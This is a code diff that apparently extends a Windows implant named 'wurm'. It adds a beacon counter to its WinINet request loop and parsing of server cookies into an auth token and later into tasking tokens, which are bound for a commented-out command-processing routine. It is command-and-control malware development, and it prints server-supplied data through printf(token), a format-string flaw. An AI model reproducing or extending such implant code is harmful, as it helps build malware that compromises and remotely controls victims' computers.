@@ -32,6 +32,9 @@ struct {
         CHAR    product[MAX_PATH];
         DWORD   pid;
     } info;
+    struct {
+        INT     count;
+    } beacon;
 } wurm;
 
 void Encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
@@ -88,6 +91,8 @@ void Request() {
     DWORD buffer_length = 0;
     DWORD available_size = 0;  
     DWORD dw_error = GetLastError();
+
+    wurm.beacon.count += 1;
 
     // Set handle to initialize wininet functions
     hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -147,9 +152,36 @@ void Request() {
 
         printf("Cookie: %s\n", cookie);
 
+        goto process_cookie;
+
     } else {
         printf("Error: %lu\n", dw_error);
     }
+
+    process_cookie:
+        if (wurm.beacon.count <= 1) {
+            CHAR* token = strtok(cookie, " ");
+
+            if (strtok(NULL, " ") == NULL && strlen(cookie) == 20) {
+                wurm.auth.cookie = cookie;
+            } else {
+                printf("Error: Unknown response");
+            }
+        } else {
+            CHAR* token = strtok(cookie, " ");
+            if (strtok(NULL, " ") == NULL) {
+                printf(token);
+                // Process(cookie, input);
+            } else {
+                while (token != NULL) {
+                    printf(token);
+                    token = strtok(NULL, " ");
+                }
+                
+                CHAR* input = NULL;
+                // Process(cookie, input);
+            }
+        }
 
     // Clean up memory and handles
     goto cleanup;
@@ -161,7 +193,6 @@ void Request() {
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hRequest);
         return;
-
 }
 
 void Register() {
